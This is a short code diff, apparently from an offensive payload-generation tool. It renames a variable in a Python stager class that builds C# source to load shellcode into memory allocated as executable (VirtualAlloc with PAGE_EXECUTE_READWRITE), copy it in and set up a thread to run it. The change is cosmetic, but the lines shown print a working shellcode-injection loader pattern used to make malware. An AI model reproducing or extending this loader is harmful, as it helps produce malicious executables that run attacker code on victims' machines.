@@ -31,12 +31,12 @@ class Stager:
 	def generate(self):
 		
 		self.shellcode = shellcode.Shellcode()
-		Shellcode = self.shellcode.generate()
-		Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
+		shellcode = self.shellcode.generate()
+		shellcode = "0" + ",0".join(shellcode.split("\\")[1:])
 
 		payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
 		payloadCode += "namespace payload { class Program  { static void Main() {\n"
-		payloadCode += "byte[] s = {"+Shellcode+"};"
+		payloadCode += "byte[] s = {"+shellcode+"};"
 		payloadCode += "UInt32 funcAddr = VirtualAlloc(0, (UInt32)s.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
 		payloadCode += "Marshal.Copy(s, 0, (IntPtr)(funcAddr), s.Length);\n"
 		payloadCode += "IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;\n"
